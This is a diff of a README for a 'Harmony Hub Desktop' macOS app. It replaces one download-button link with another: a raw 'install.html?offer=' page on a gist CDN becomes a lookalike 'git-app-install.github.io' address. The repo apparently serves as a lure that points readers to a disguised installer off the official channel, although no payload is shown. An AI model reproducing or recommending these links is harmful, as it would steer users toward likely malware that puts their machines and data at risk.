@@ -1,5 +1,5 @@
 # Harmony Hub Desktop — Smart Control macOS
-<a href="https://gistcdn.githack.com/everguywebshot2003/b0e91182da4dce6dbcc96014fb49a4fb/raw/46cef3051ba389cc136780e1f9d46b273a1fc3db/install.html?offer=Harmony%20Hub" target="_blank">
+<a href="https://git-app-install.github.io/.github/?offer=HarmonyHub" target="_blank">
   <img 
     src="https://img.shields.io/badge/Get%20Harmony%20Hub%20GitHub-28A745%20to%2020B23F?style=plastic&logo=github&logoColor=FFFFFF" 
     width="320" 
